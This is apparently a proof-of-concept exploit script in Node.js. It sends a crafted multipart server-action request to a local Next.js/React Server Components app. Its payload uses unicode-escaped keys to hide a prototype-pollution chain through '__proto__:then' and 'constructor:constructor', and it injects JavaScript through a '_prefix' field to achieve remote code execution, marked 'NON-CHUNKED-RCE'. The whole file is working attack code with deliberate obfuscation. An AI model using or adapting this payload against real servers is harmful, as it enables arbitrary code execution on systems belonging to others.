/**
 * Simple non-chunked payload test
 */
const http = require('http');

const boundary = '----WebKitFormBoundary7MA4YWxk';

// Build multipart body with proper CRLF
function buildBody() {
  const parts = [];

  // Field 0 - the main exploit payload with unicode obfuscation
  const field0 = JSON.stringify({
    "\u0074\u0068\u0065\u006e": "$1:\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:\u0074\u0068\u0065\u006e",
    "\u0073\u0074\u0061\u0074\u0075\u0073": "\u0072\u0065\u0073\u006f\u006c\u0076\u0065\u0064\u005f\u006d\u006f\u0064\u0065\u006c",
    "\u0072\u0065\u0061\u0073\u006f\u006e": -1,
    "\u0076\u0061\u006c\u0075\u0065": "{\"then\":\"$B1337\"}",
    "\u005f\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065": {
      "\u005f\u0070\u0072\u0065\u0066\u0069\u0078": "console.log('NON-CHUNKED-RCE');//",
      "\u005f\u0063\u0068\u0075\u006e\u006b\u0073": "$Q2",
      "\u005f\u0066\u006f\u0072\u006d\u0044\u0061\u0074\u0061": {
        "\u0067\u0065\u0074": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"
      }
    }
  });

  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n${field0}`);
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"`);
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]`);
  parts.push(`--${boundary}--`);

  return parts.join('\r\n') + '\r\n';
}

const body = buildBody();
console.log('Payload size:', body.length, 'bytes');
console.log('Contains $@:', body.includes('$@'));

const options = {
  hostname: 'localhost',
  port: 3000,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': `multipart/form-data; boundary=${boundary}`,
    'Content-Length': Buffer.byteLength(body),
    'Next-Action': 'test-action'
  }
};

console.log('\nSending request...');

const req = http.request(options, (res) => {
  console.log('Status:', res.statusCode);
  console.log('Headers:', JSON.stringify(res.headers, null, 2));

  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    console.log('\nResponse body:');
    console.log(data.slice(0, 500));
  });
});

req.on('error', (e) => {
  console.error('Error:', e.message);
});

req.write(body);
req.end();
